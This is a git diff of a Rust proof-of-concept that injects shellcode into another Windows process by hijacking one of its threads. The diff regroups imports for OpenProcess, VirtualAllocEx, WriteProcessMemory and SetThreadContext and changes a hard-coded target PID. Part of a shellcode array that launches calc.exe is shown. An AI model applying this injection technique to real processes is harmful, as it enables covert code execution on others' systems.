@@ -1,12 +1,14 @@
 use std::ffi::c_void;
 use std::mem::{size_of, zeroed};
 use std::ptr::{null, null_mut};
-use windows_sys::Win32::System::Diagnostics::Debug::{CONTEXT, CONTEXT_FULL_AMD64, GetThreadContext, SetThreadContext};
-use windows_sys::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, Thread32First, Thread32Next, THREADENTRY32};
-use windows_sys::Win32::System::Threading::{OpenProcess, OpenThread, PROCESS_ALL_ACCESS, ResumeThread, SuspendThread, THREAD_ALL_ACCESS};
+
 use windows_sys::Win32::Foundation::FALSE;
-use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx};
-use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
+use windows_sys::Win32::System::{
+    Diagnostics::Debug::{CONTEXT, CONTEXT_FULL_AMD64, GetThreadContext, SetThreadContext, WriteProcessMemory},
+    Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, Thread32First, Thread32Next, THREADENTRY32},
+    Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
+    Threading::{OpenProcess, OpenThread, PROCESS_ALL_ACCESS, ResumeThread, SuspendThread, THREAD_ALL_ACCESS},
+};
 
 fn main() {
     unsafe {
@@ -36,7 +38,7 @@ fn main() {
             0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,
             0x2e,0x65,0x78,0x65,0x00];
 
-        let target_pid = 1952; // <--- CHANGE THIS
+        let target_pid = 25692; // <--- CHANGE THIS
         let mut thread_hijacked = 0;
 
         let mut context: CONTEXT = zeroed();
